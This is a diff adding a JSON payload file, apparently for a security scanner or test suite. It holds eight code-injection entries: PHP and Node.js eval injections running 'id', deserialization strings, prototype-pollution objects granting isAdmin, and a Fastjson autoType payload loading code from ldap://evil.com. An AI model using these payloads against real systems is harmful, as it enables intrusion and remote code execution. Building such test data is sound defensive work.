@@ -1,0 +1,82 @@
+[
+  {
+    "id": "code-001",
+    "family": "code_injection",
+    "subtype": "eval",
+    "payload_string": "1; system('id')",
+    "context": "string",
+    "description": "PHP eval injection for OS command execution",
+    "references": ["https://owasp.org/www-community/attacks/Code_Injection"],
+    "platform_specific": {"php": true}
+  },
+  {
+    "id": "code-002",
+    "family": "code_injection",
+    "subtype": "deserialization",
+    "payload_string": "O:8:\"stdClass\":0:{}",
+    "context": "string",
+    "description": "PHP object injection via deserialization",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
+    "platform_specific": {"php": true}
+  },
+  {
+    "id": "code-003",
+    "family": "code_injection",
+    "subtype": "prototype_pollution",
+    "payload_string": "{\"__proto__\":{\"isAdmin\":true}}",
+    "context": "json",
+    "description": "JavaScript prototype pollution to add admin property",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"],
+    "platform_specific": {"javascript": true}
+  },
+  {
+    "id": "code-004",
+    "family": "code_injection",
+    "subtype": "prototype_pollution",
+    "payload_string": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+    "context": "json",
+    "description": "Prototype pollution via constructor prototype chain",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"],
+    "platform_specific": {"javascript": true}
+  },
+  {
+    "id": "code-005",
+    "family": "code_injection",
+    "subtype": "deserialization",
+    "payload_string": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1w",
+    "context": "string",
+    "description": "Java deserialization attack payload (Base64 encoded)",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Deserialization"],
+    "platform_specific": {"java": true}
+  },
+  {
+    "id": "code-006",
+    "family": "code_injection",
+    "subtype": "eval",
+    "payload_string": "1; require('child_process').execSync('id')",
+    "context": "string",
+    "description": "Node.js eval injection for command execution",
+    "references": ["https://owasp.org/www-community/attacks/Code_Injection"],
+    "platform_specific": {"nodejs": true}
+  },
+  {
+    "id": "code-007",
+    "family": "code_injection",
+    "subtype": "deserialization",
+    "payload_string": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
+    "context": "json",
+    "description": "Java deserialization via Fastjson autoType",
+    "references": ["https://github.com/alibaba/fastjson/wiki/security_update"],
+    "platform_specific": {"java": true, "fastjson": true}
+  },
+  {
+    "id": "code-008",
+    "family": "code_injection",
+    "subtype": "prototype_pollution",
+    "payload_string": "{\"__proto__\":{\"polluted\":\"YES\"}}",
+    "context": "json",
+    "description": "Basic prototype pollution detection payload",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"],
+    "platform_specific": {"javascript": true}
+  }
+]
